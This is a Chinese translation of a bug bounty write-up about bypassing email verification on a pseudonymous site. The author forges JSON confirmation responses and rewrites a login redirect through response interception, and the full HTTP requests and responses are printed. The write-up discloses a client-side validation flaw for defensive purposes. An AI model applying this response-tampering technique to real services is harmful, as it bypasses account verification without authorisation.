<html>
<head>
<title>A Curious Case From Little To Complete Email Verification Bypass</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">一个从很少到完全绕过电子邮件验证的奇怪案例</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/a-curious-case-from-little-to-complete-email-verification-bypass-2c7570040e7e?source=collection_archive---------0-----------------------#2019-01-01">https://infosecwriteups.com/a-curious-case-from-little-to-complete-email-verification-bypass-2c7570040e7e?source=collection_archive---------0-----------------------#2019-01-01</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="8bd5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">实现安全的电子邮件验证机制很容易出错。验证中的一个小错误会导致小问题或漏洞。然而，我要掩盖我最近遇到的一个案例。</p><p id="ddd1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输入所需的详细信息(名字、姓氏、电子邮件)后，将会发送一封验证邮件，以验证用户的真实性。验证邮件的结构如下</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="4efc" class="ku kv iq kq b gy kw kx l ky kz"><a class="ae la" href="https://yolosite.com/#/register/confirm/6135fbbf3e52effa1a04c6fcf7e1dd426f2cdf36803f413481b62e2803b52dad/" rel="noopener ugc nofollow" target="_blank">https://yolosite.com/#/register/confirm/6135fbbf3e52effa1a04c6fcf7e1dd426f2cdf36803f413481b62e2803b52dad</a></span></pre><p id="cb89" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问该链接，您将被提示输入更多信息，如信用卡信息等。更改令牌的值导致了<code class="fe lb lc ld kq b">Confirmation link is invalid.</code>，看起来令牌正在被验证。但是进一步检查发现<code class="fe lb lc ld kq b">JSON</code>响应体是验证的罪魁祸首。</p><p id="f463" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如，如果上面的链接被访问，下面将是响应:-</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="18d3" class="ku kv iq kq b gy kw kx l ky kz">HTTP/1.1 200 OK<br/>Content-Type: application/json<br/>Access-Control-Allow-Origin: *<br/>Access-Control-Allow-Credentials: true<br/>Access-Control-Max-Age: 1000<br/>Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT<br/>Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With, <br/></span><span id="0821" class="ku kv iq kq b gy le kx l ky kz">{"response":{"status":"success","externalID":null,"errors":[]}}</span></pre><p id="74c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，如果令牌被篡改(更改了第一个和最后一个值)，将会出现以下响应:-</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="1cae" class="ku kv iq kq b gy kw kx l ky kz">HTTP/1.1 200 OK<br/>Content-Type: application/json<br/>Access-Control-Allow-Origin: *<br/>Access-Control-Allow-Credentials: true<br/>Access-Control-Max-Age: 1000<br/>Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT<br/>Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With, </span><span id="b4d5" class="ku kv iq kq b gy le kx l ky kz">{"response":{"status":"failure","externalID":"7<a class="ae la" href="https://yolosite.com/#/register/confirm/6135fbbf3e52effa1a04c6fcf7e1dd426f2cdf36803f413481b62e2803b52dad/" rel="noopener ugc nofollow" target="_blank">135fbbf3e52effa1a04c6fcf7e1dd426f2cdf36803f413481b62e2803b52da</a>e<!-- -->","errors":[{"code":"1210","message":"Confirmation link is invalid"}]},"userStatus":null}</span></pre><p id="d803" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最初我认为这可能是因为令牌部分正确，所以我决定使用完全随机的令牌。所以我伪造了如下链接</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="7bc8" class="ku kv iq kq b gy kw kx l ky kz"><a class="ae la" href="https://yolosite.com/#/register/confirm/6135fbbf3e52effa1a04c6fcf7e1dd426f2cdf36803f413481b62e2803b52dad/" rel="noopener ugc nofollow" target="_blank">https://yolosite.com/#/register/confirm/</a>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span></pre><p id="c28f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下是回应:-</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="e221" class="ku kv iq kq b gy kw kx l ky kz">HTTP/1.1 200 OK<br/>Content-Type: application/json<br/>Access-Control-Allow-Origin: *<br/>Access-Control-Allow-Credentials: true<br/>Access-Control-Max-Age: 1000<br/>Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT<br/>Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With<br/>Connection: close<br/>Set-Cookie: Cookies here;<br/><br/>{"response":{"status":"failure","externalID":"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx","errors":[{"code":"1211","message":"User not associated with this external id"}]},"userStatus":null}</span></pre><p id="a147" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我再次尝试伪造链接，但这次我决定拦截响应，并用<code class="fe lb lc ld kq b">{"response":{"status":"success","externalID":null,"errors":[]}}</code>替换上面的<code class="fe lb lc ld kq b">JSON</code></p><p id="6500" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我被要求输入信用卡的详细信息。这不是唯一需要绕过的端点。事实证明，防御机制仅仅基于<code class="fe lb lc ld kq b">JSON</code>响应，没有进行服务器端验证。然而，在进一步尝试输入信用卡详细信息并点击<strong class="jp ir">完成注册</strong>之后，请求和响应被启动</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="7fea" class="ku kv iq kq b gy kw kx l ky kz">POST /rest/services/public/register/full HTTP/1.1<br/>Host: yolosite.com<br/>Connection: close<br/><br/>{"externalId":"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx","locale":"en_IT","fullRegFields":{"card-alias-name-0":"Card-Name","card-numbers-0":"card-number","expiry-month-0":"MONTH","expiry-year-0":"2019","cvc-0":"cvc"}}</span></pre><p id="6b92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下是对上述请求的回应</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="6c07" class="ku kv iq kq b gy kw kx l ky kz">HTTP/1.1 400 Bad Request<br/>Content-Type: application/json<br/>Access-Control-Allow-Origin: *<br/>Access-Control-Allow-Credentials: true<br/>Access-Control-Max-Age: 1000<br/>Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT<br/>Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With<br/>Connection: close<br/>Set-Cookie: Cookies here;</span><span id="2a34" class="ku kv iq kq b gy le kx l ky kz">{"status":"error","externalID":"","errors":[{"code":"0000","message":"An internal server error occurred"}]}</span></pre><p id="bb5f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此时，这似乎是检查令牌的实际端点。尽管如此，我还是决定再次伪造回复，最终回复如下</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="035a" class="ku kv iq kq b gy kw kx l ky kz">HTTP/1.1 200 OK<br/>Content-Type: application/json<br/>Access-Control-Allow-Origin: *<br/>Access-Control-Allow-Credentials: true<br/>Access-Control-Max-Age: 1000<br/>Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT<br/>Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With<br/>Connection: close<br/>Set-Cookie: Cookies here;</span><span id="af82" class="ku kv iq kq b gy le kx l ky kz">{"response":{"status":"success","externalID":null,"errors":[]}}</span></pre><p id="a995" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">上面的回复一转发，我就被带到了登录页面。但结果并不像我所期待的那样，我尝试登录，但我不能这样做。我决定进一步调查。</p><p id="92c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当经过<strong class="jp ir">验证的</strong>用户尝试登录时，请求如下。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="ffe3" class="ku kv iq kq b gy kw kx l ky kz">POST /pkmslogin.form HTTP/1.1<br/>Host: yolosite.com<br/>Connection: close<br/>Content-Type: application/x-www-form-urlencoded<br/><br/>username=username-here&amp;password=Password-here&amp;login-form-type=pwd</span></pre><p id="48b5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下是我的回应</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="4a5d" class="ku kv iq kq b gy kw kx l ky kz">HTTP/1.1 302 Moved Temporarily<br/>Content-Length: 1770<br/>Content-Type: text/html<br/>Location: https://yolosite.com/rest/services/public/lrr?TAM_OP=login_success&amp;USERNAME=USERNAME-HERE&amp;ERROR_CODE=0x38cf05e7&amp;ERROR_TEXT=DPWWA1511I%20%20%20Login%20successful&amp;URL=%2Fpkmslogin.form&amp;REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.htm&amp;HOSTNAME=yolosite.com&amp;AUTHNLEVEL=<br/>p3p: CP="NON CUR OTPi OUR NOR UNI"<br/>Cache-Control: no-cache<br/>Pragma: no-cache<br/>Date: Sun, 04 Nov 2018 08:36:33 GMT<br/>Connection: close<br/>Set-Cookie: Cookies-here;<br/><br/><strong class="kq ir">&lt;html&gt;</strong><br/><strong class="kq ir">&lt;P&gt;&lt;A</strong> HREF="https://yolosite.com/rest/services/public/lrr?TAM_OP=login_success&amp;USERNAME=USERNAMEHERE&amp;ERROR_CODE=0x38cf05e7&amp;ERROR_TEXT=DPWWA1511I%20%20%20Login%20successful&amp;URL=%2Fpkmslogin.form&amp;REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.html&amp;HOSTNAME=yolosite.com&amp;AUTHNLEVEL="<strong class="kq ir">&gt;</strong>Click here<strong class="kq ir">&lt;/A&gt;</strong> to fetch the resource.<br/><strong class="kq ir">&lt;/html&gt;</strong></span></pre><p id="0801" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我试着用一个<strong class="jp ir">未验证的账户</strong>做了尝试，下面是回应</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="4da1" class="ku kv iq kq b gy kw kx l ky kz">HTTP/1.1 302 Moved Temporarily<br/>Content-Length: 1811<br/>Content-Type: text/html<br/>Location: https://yolosite.com/rest/services/public/lrr?TAM_OP=help&amp;USERNAME=USERNAMEHERE&amp;ERROR_CODE=0x13212079&amp;ERROR_TEXT=HPDIA0121W%20%20%20The%20requested%20operation%20is%20not%20valid.&amp;URL=%2Fpkmslogin.form&amp;REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.html&amp;HOSTNAME=yolosite.com&amp;AUTHNLEVEL=<br/>Connection: close<br/>Set-Cookie: Cookies-here;<br/><br/><strong class="kq ir">&lt;html&gt;</strong><br/><strong class="kq ir">&lt;P&gt;&lt;A</strong> HREF="https://yolosite.com/rest/services/public/lrr?TAM_OP=help&amp;USERNAME=USERNAMEHERE&amp;ERROR_CODE=0x13212079&amp;ERROR_TEXT=HPDIA0121W%20%20%20The%20requested%20operation%20is%20not%20valid.&amp;URL=%2Fpkmslogin.form&amp;REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.html&amp;HOSTNAME=yolosite.com&amp;AUTHNLEVEL="<strong class="kq ir">&gt;</strong>Click here<strong class="kq ir">&lt;/A&gt;</strong> to fetch the resource.<br/><strong class="kq ir">&lt;/html&gt;</strong></span></pre><p id="cd0b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我再次篡改了上面的回复，最终编辑后的回复如下</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="e31c" class="ku kv iq kq b gy kw kx l ky kz">HTTP/1.1 302 Moved Temporarily<br/>Content-Length: 1770<br/>Content-Type: text/html<br/>Location: https://yolosite.com/rest/services/public/lrr?TAM_OP=login_success&amp;USERNAME=USERNAME-HERE&amp;ERROR_CODE=0x38cf05e7&amp;ERROR_TEXT=DPWWA1511I%20%20%20Login%20successful&amp;URL=%2Fpkmslogin.form&amp;REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.htm&amp;HOSTNAME=yolosite.com&amp;AUTHNLEVEL=<br/>p3p: CP="NON CUR OTPi OUR NOR UNI"<br/>Cache-Control: no-cache<br/>Pragma: no-cache<br/>Date: Sun, 04 Nov 2018 08:36:33 GMT<br/>Connection: close<br/>Set-Cookie: Cookies-here;<br/><br/><strong class="kq ir">&lt;html&gt;</strong><br/><strong class="kq ir">&lt;P&gt;&lt;A</strong> HREF="https://yolosite.com/rest/services/public/lrr?TAM_OP=login_success&amp;USERNAME=USERNAMEHERE&amp;ERROR_CODE=0x38cf05e7&amp;ERROR_TEXT=DPWWA1511I%20%20%20Login%20successful&amp;URL=%2Fpkmslogin.form&amp;REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.html&amp;HOSTNAME=yolosite.com&amp;AUTHNLEVEL="<strong class="kq ir">&gt;</strong>Click here<strong class="kq ir">&lt;/A&gt;</strong> to fetch the resource.<br/><strong class="kq ir">&lt;/html&gt;</strong></span></pre><p id="8524" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">上面的回复一转发，我就成功地绕过剩余的检查登录了这个账户。耶。</p><h1 id="3c76" class="lf kv iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated"><strong class="ak">最终想法</strong></h1><p id="179e" class="pw-post-body-paragraph jn jo iq jp b jq mc js jt ju md jw jx jy me ka kb kc mf ke kf kg mg ki kj kk ij bi translated">由于我能够完全绕过电子邮件验证，我本可以尝试注册@yolosite.com电子邮件，但为时已晚。</p><figure class="kl km kn ko gt mi gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/37877afeb3d32f2aa6598375c9925a8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:980/format:webp/1*Vm2QL2-d8EhvPqwOcXMJ7Q.jpeg"/></div></figure></div></div>    
</body>
</html>